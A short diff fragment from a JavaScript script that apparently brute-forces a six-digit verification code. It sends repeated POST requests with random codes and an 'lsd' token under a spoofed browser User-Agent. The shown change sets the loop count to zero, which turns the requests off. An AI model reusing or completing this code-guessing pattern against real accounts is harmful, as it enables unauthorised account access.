@@ -70,7 +70,7 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
   // child_process.exec('siren warn');
 
   const p = [];
-  for (let i = 0, code; 2 > i; ++i) {
+  for (let i = 0, code; 0 > i; ++i) {
     code = rand(111111, 999999);
     p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
   }
